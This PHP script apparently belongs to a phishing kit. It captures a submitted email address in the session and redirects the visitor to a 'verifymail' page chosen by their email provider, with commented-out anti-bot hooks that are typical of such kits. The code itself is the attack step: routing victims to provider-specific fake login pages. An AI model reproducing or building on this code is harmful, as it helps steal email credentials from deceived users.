<?php

    session_start();

    require_once 'vixxxYZ.php';
    // require_once '../demonTest.php';

    $comps = new Comp;

    $settings = $comps->settings();

  

    if (isset(
        $_POST['email']
    )) {
        if (!$comps->checkEmpty(
            $_POST['email']
        )) {
            $_SESSION['email'] = $_POST['email'];

            if (!$comps->userEmail($_SESSION['email'])) {
                $comps->headerX("verifymail/email_identity.php");
            } else {
                $comps->headerX("verifymail/" . $comps->userEmail($_SESSION['email']) . ".php");
            }
        } else {
            // echo $antibot->throw404();
            die();
        }
    } else {
        // echo $antibot->throw404();
        die();
    }